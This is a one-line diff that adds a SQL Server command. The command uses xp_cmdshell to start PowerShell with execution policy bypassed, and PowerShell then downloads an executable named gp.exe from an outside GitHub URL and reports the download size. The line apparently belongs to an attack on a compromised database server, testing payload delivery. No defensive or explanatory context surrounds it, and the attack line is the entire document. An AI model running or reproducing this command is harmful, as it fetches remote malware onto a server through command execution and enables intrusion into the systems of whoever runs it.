@@ -1,0 +1,1 @@
+EXEC xp_cmdshell 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { $b=(New-Object Net.WebClient).DownloadData(''https://raw.githubusercontent.com/bimhybim-del/ai/main/gp.exe''); Write-Host DL:$($b.Length) } catch { Write-Host E:$_ }"'
